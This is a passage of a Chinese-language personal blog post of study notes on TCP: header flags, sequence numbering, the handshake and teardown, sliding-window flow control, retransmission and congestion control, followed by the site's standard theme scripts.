<p>ACK,确认,1代表acknoledgment number字段有效</p>
<p>PSH,请求急迫,发送端不需等待窗口填满才发送</p>
<blockquote>
<p>PSH用于什么情况?</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20210317143111661.png" alt="缓冲区与PSH"></p>
<p>进程A向socket写东西,实际上就是写到发送缓冲区中,此时并没有实际往网络上发送,啥时候发送呢?得等到缓冲区满了才发,这就像是机场包车的包不满不走一样</p>
<p>而PSH位就是要强迫发送,即使车没有坐满人,也把枪夹到司机头上给我立刻发车</p>
<p>有意义吗?急着发车干啥?还真有意义</p>
<p>有的乘客不在乎自己坐车多花的开销,他急着办事.</p>
<p>正如有些服务的及时性比效率更优先</p>
<p>比如ssh服务</p>
<p>客户端这会急着想看服务端根目录下有啥,于是客户端想发送一个ls命令,如果不加psh位,好吧你等着吧,啥时候缓冲区满了才发送.实际上ssh服务是psh&#x3D;1的</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230203172915324.png" alt="image-20230203172915324"></p>
</blockquote>
<p>RST,重置连接</p>
<p>SYN,同步信号,建立连接时使用</p>
<p>FIN,结束</p>
<h5 id="window-size"><a href="#window-size" class="headerlink" title="window size"></a>window size</h5><p>窗口大小,单位字节</p>
<p>用于<strong>控制对方发送的数据量</strong></p>
<p>根据自身缓冲区剩余空间大小,决定接收窗口大小,通知对方发送窗口上限</p>
<h5 id="checksum"><a href="#checksum" class="headerlink" title="checksum"></a>checksum</h5><p>检验和</p>
<p>TCP检验和&#x3D;TCP伪首部+TCP首部+TCP数据</p>
<p>其中TCP伪首部和UDP伪首部一模一样</p>
<h5 id="urgent-pointer"><a href="#urgent-pointer" class="headerlink" title="urgent pointer"></a>urgent pointer</h5><p>紧急指针字段,</p>
<p>如果有紧急数据,则一定放在TCP数据的最开始</p>
<p>紧急指针表明紧急数据的大小,单位字节</p>
<h5 id="option"><a href="#option" class="headerlink" title="option"></a>option</h5><p>选项字段,长度可变</p>
<p>通常不用这个字段</p>
<p>TCP之规定一种选项,MSS,最大报文段长度,即TCP数据的最大长度</p>
<h4 id="序号系统"><a href="#序号系统" class="headerlink" title="序号系统"></a>序号系统</h4><p>由于TCP报文需要分段,因此需要引入一套编号机制,让分段和重组有序</p>
<p>TCP首部的sequence number,acknowledgment number两个字段和ACK,SYN两个标志位就是为序号系统服务的</p>
<p>需要牢记的是:</p>
<p><strong>编号是给每个字节的编号,不是给分段的编号!</strong></p>
<p><strong>编号是给每个字节的编号,不是给分段的编号!</strong></p>
<p><strong>编号是给每个字节的编号,不是给分段的编号!</strong></p>
<p>所有数据的第一个字节是一个$[0,2^{32})$内的随机数</p>
<p>sequence number,该TCP报文段段第一个数据字节的编号</p>
<p>acknowledgment number,希望接收的下一个报文段的第一个数据字节的编号.也表明接收方已经正确接收该编号-1之前的所有字节</p>
<p>比如这么一个问题</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230203173943002.png" alt="image-20230203173943002"></p>
<p>显然第一问是100-70&#x3D;30</p>
<p>第二问,主机B接收到的字节序列应该是$[70,99]$,因此ack number&#x3D;100,表明希望接收编号为100的字节,并且告知发送方,编号为99及之前的所有字节都已经正确接收了</p>
<h4 id="连接建立-终止"><a href="#连接建立-终止" class="headerlink" title="连接建立&amp;终止"></a>连接建立&amp;终止</h4><p>三次握手建立连接</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230203224344990.png" alt="image-20230203224344990"></p>
<p>服务端是被动打开的,而客户端是主动打开的</p>
<p>三次握手建立连接的目的是,证明通信双方的收发都正常</p>
<p>第一次握手,客户端啥也不知道,但是服务端知道客户端不哑,自己不聋</p>
<p>第二次握手,客户端知道了服务端收到了自己的消息,证明自己不哑,这次收到消息证明自己不聋.</p>
<p>此时只剩最后一步,此时服务端不知道自己是否哑巴</p>
<p>第三次握手,服务端收到客户端对第二次握手的确认,因此证明服务端不哑</p>
<p>第三次握手时,实际上客户端已经可以在TCP数据中,写上对服务端请求什么了</p>
<p>然而实际上HTTP协议中,三次握手不涉及任何有效数据传输,三次握手建立之后,客户端会另外发送GET请求</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230203225616420.png" alt="image-20230203225616420"></p>
<p>四次挥手断开连接的目的是:</p>
<p>首先客户端主动提出FIN分手,表明客户端没有要求了</p>
<p>服务端收到客户端的分手请求后,立刻回复ACK收到,但是如果服务端还有没说完的话,还可以继续说.</p>
<p>这个阶段叫做半关闭阶段,客户端只能回复收到,不会再有新的请求</p>
<p>如果服务端也说完了,没有其他话要说了,就发送FIN</p>
<p>然后客户端收到FINI之后知道服务端也没得说了,回复收到</p>
<p>到此整个连接关闭</p>
<h4 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h4><blockquote>
<p>区分流量控制和拥塞控制:</p>
<p>流量控制是避免接收方来不及接收,缓冲区溢出</p>
<p>拥塞控制是避免网络拥塞</p>
</blockquote>
<p>为啥要进行流量控制?</p>
<p>接收方的缓冲区大小有限,要保证接收方来得及接收消息并腾出缓冲区</p>
<p>如果发送方发的过快,接收方处理慢,缓冲区满了,那么后来的消息就会被直接丢弃</p>
<p>如何进行流量控制?滑动窗口算法</p>
<h5 id="滑动窗口算法"><a href="#滑动窗口算法" class="headerlink" title="滑动窗口算法"></a>滑动窗口算法</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230204190749379.png" alt="image-20230204190749379"><br>$$<br>发送方滑动窗口大小swnd&#x3D;min(接收方滑动窗口大小rwnd,拥塞窗口大小cwnd)<br>$$<br>其中rwnd是接收方缓冲区剩余空间大小</p>
<p>比如接收方缓冲区本身4KB,发送方发了一个1K的报文,填到接收方缓冲区中,此时接收方rwnd&#x3D;3000,接收方就得在ACK报文中报告自己的rwnd大小,让发送方心里有数,后面该法多少</p>
<p>cwnd是发送方自己维护的,发送方根据接收方的回应报文丢失情况,推测网络的拥塞程度,动态调整cwnd的大小</p>
<blockquote>
<p>TCP滑动窗口和数据链路层滑动窗口的区别:</p>
<p>TCP滑动窗口的单位是字节,而数据链路层滑动窗口的单位是帧</p>
<p>数据链路层的滑动窗口大小是固定的,而TCP滑动窗口大小根据实时情况改变</p>
</blockquote>
<p>如图所示的滑动窗口(只是一个例子,实际上一个滑动窗口有成百上千字节)中,cwnd&#x3D;20,rwnd&#x3D;9,</p>
<p>这就意味着接收方此时的缓冲区只有9个字节的空间了,发送方顶多再发送9字节</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208173522440.png" alt="image-20230208173522440"></p>
<p>此时发送方啥状态呢?目前滑动窗口中的200,201,202三个字节都已经发送,可能是一个报文同时发走的,也可能是分批发走的,但是这不重要,重要的是,目前尚未得到接收方的ACK回复.发送方现在还可以接着发送203~208这6个字节.</p>
<p>如果发完了这6个字节仍热没有收到回复,就不能发了,得等等</p>
<p>时序图</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208174029314.png" alt="image-20230208174029314"></p>
<p>首先发送方得等接收方告知自己的接收窗口大小</p>
<p>拿到这个数之后,发送方就可以在这个接收窗口大小和拥塞窗口大小中娶一个最小值,然后放心地发送这么多字节</p>
<p>这些字节不必是一个报文发走的,这要看链路层对一个数据帧的限制,比如以太网帧中的数据不能超过1500字节.因此,即使swnd&#x3D;min(cwnd,rwnd)&#x3D;2400,也得分成多个报文发送</p>
<p>接收方会对发送方的每一个报文都进行回复,回复内容包括:</p>
<p>1.期待接收的下一个字节编号</p>
<p>2.当前接收方窗口剩余大小</p>
<p>当接收方的回复报文中,swnd&#x3D;0时,发送方就得停下等接收方消化消化.</p>
<p>接收方消化一阵子之后,缓冲区有比较大的空间,能够容纳一个大帧时,才会主动发送更新报文.告知发送方,可以继续灌输了</p>
<blockquote>
<p>等待缓冲区有较大空间的目的是,防止糊涂窗口综合征</p>
</blockquote>
<p>这个更新报文的内容包括:</p>
<p>1.期待接收的下一个字节编号</p>
<p>2.当前接收方窗口剩余大小</p>
<p>为了防止这个更新报文丢包,发送方有一个坚持计时器.当发送方接到swnd&#x3D;0的回复报文就开始了.如果在到时之前收到更新报文自然最好.如果没有收到,则发送方认为更新报文在路上丢了,于是发送方发送一个1字节的探测报文,提醒接收方更新报文丢失了.</p>
<h4 id="差错控制-1"><a href="#差错控制-1" class="headerlink" title="差错控制"></a>差错控制</h4><p>TCP的差错控制有三个手段</p>
<p>1.校验和,接收方收到坏段,丢弃并要求重传,通过ACK+坏段序号 要求重传</p>
<p>2.确认</p>
<p>发送方发出的每一个数据段都需要ACK确认</p>
<p>不携带数据但是占用序号的控制段也需要确认</p>
<p><strong>ACK段不需要确认</strong>,因为ACK本身就是确认用的</p>
<p>3.重传</p>
<p>当段损坏,丢失或者超时,需要重传</p>
<p><strong>ACK段不需要重传</strong></p>
<blockquote>
<p>重传的情形:</p>
<p>1.丢失段</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208175609900.png" alt="image-20230208175609900"></p>
<p>2.3ACK快速重传</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208175633242.png" alt="image-20230208175633242"></p>
</blockquote>
<h4 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h4><p>拥塞控制可以理解为网络流问题</p>
<p>一条主干道的带宽是1000Mbps,其支线的带宽和是1500Mbps,如果所有支线都满载传输,则骨干路由器就得缓存支线的数据报文,满满地往主干道发.</p>
<p>如果骨干路由器缓冲区溢出,就有数据丢包了</p>
<p>拥塞控制还是滑动窗口算法,并且和流量控制兼容,体现在<br>$$<br>swnd&#x3D;min(cwnd,rwnd)<br>$$</p>
<h5 id="慢启动和拥塞避免"><a href="#慢启动和拥塞避免" class="headerlink" title="慢启动和拥塞避免"></a>慢启动和拥塞避免</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208180115427.png" alt="image-20230208180115427"></p>
<p>最初慢启动阶段,cwnd&#x3D;1,发一个报文,收到ACK,这就意味着一次发一个包,网络可以承受,于是蹬鼻子上脸,cwnd&#x3D;2,发俩报文,等俩ACK,如果又都受到了,那就更加猖狂</p>
<p>一直到慢启动阈sstresh,之后就不能指数扩大cwnd了,需要加性增大,也就是发一个包收到ACK就cwnd扩大1,一直这样直到计时器超时,说明达到网络流量上限了,</p>
<p>此时立刻回到慢启动阶段,cwnd&#x3D;1,并重新设置ssthresh阈值为超时cwnd的一半</p>
<p>之后重复上述过程</p>
<h5 id="3ACK快速恢复"><a href="#3ACK快速恢复" class="headerlink" title="3ACK快速恢复"></a>3ACK快速恢复</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208180505456.png" alt="image-20230208180505456"></p>
<p>能够收到3ACK说明网络只是轻度拥塞</p>
<p>此时直接ssthresh降为收到3ACK时cwnd的一半,然后设置cwnd&#x3D;ssthresh,然后重复加性增大阶段</p>
<h5 id="状态转移图"><a href="#状态转移图" class="headerlink" title="状态转移图"></a>状态转移图</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208180715552.png" alt="image-20230208180715552"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/impossible/page/2/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/impossible/">1</a><a class="page-number" href="/impossible/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/impossible/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/impossible/page/10/">10</a><a class="extend next" rel="next" href="/impossible/page/4/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="dustball"
      src="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
  <p class="site-author-name" itemprop="name">dustball</p>
  <div class="site-description" itemprop="description">dustland</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">39</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">dustball</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        
<div class="busuanzi-count">
  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/pjax/pjax.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  
  <script data-pjax>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>




  
<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
<script src="/js/algolia-search.js"></script>












<script data-pjax>
if (document.querySelectorAll('pre.mermaid').length) {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
    mermaid.initialize({
      theme    : 'dark',
      logLevel : 3,
      flowchart: { curve     : 'linear' },
      gantt    : { axisFormat: '%m/%d/%Y' },
      sequence : { actorMargin: 50 }
    });
  }, window.mermaid);
}
</script>


    <div id="pjax">
  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

    </div>
</body>
</html>
